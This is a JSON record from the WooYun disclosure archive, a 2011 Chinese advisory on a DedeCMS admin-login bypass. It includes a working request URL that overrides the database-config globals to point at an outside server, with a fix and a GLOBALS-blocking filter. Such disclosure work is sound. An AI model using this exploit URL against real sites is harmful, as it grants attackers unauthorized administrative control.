{"id": 22373, "wybug_id": "wooyun-2011-02663", "wybug_title": "DEDECMS爆严重安全漏洞", "wybug_corp": "Dedecms", "wybug_author": "effort5", "wybug_date": "2011-08-11 14:58", "wybug_open_date": "2011-08-16 15:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-08-16：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 众所周知，因使用简单、客户群多，织梦CMS一直被爆出许多漏洞。“DEDECMS爆严重安全漏洞，近期官方会发布相关补丁，望大家及时关注补丁动态。” 详细说明：  http://www.xx.com/织梦网站后台/login.php?dopost=login&validate=dcug&userid=admin&pwd=inimda&_POST[GLOBALS][cfg_dbhost]=116.255.183.90&_POST[GLOBALS][cfg_dbuser]=root&_POST[GLOBALS][cfg_dbpwd]=r0t0&_POST[GLOBALS][cfg_dbname]=root把上面黑底黄字上的字母改为当前的验证码，即可直接进入网站后台。   漏洞证明：     修复方案：  此漏洞的前提是必须得到后台路径才能实现，因此大家一定要养成使用DEDECM建站时改后台名字的习惯。下面给出官方的解决办法：解决办法：找到include/common.inc.php文件，把    foreach($_REQUEST as $_k=>$_v)    {        var_dump($_k);        if( strlen($_k)>0 && preg_match('#^(cfg_|GLOBALS)#',$_k) )        {            exit('Request var not allow!');        }    }换成    //检查和注册外部提交的变量    function CheckRequest(&$val) {        if (is_array($val)) {            foreach ($val as $_k=>$_v) {                CheckRequest($_k);                CheckRequest($val[$_k]);            }        } else        {            if( strlen($val)>0 && preg_match('#^(cfg_|GLOBALS)#',$val) )            {                exit('Request var not allow!');            }        }    }    CheckRequest($_REQUEST);   版权声明：转载请注明来源 effort5@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2011-08-11 17:33 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  万恶的php标签    \n     2011-08-12 10:04 |    \t\ttenzy \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:21        | Need not to know)\t\t \n  ...该爆的还是会爆的。。好久的洞洞了    \n     2011-08-15 00:24 |    \t\t白细胞 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:6        )\t\t \n  流亡青年他们几个搞的，在上传案例那里，怀疑是上传漏洞。http://www.dedecms.com/caseshow/sck.html    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}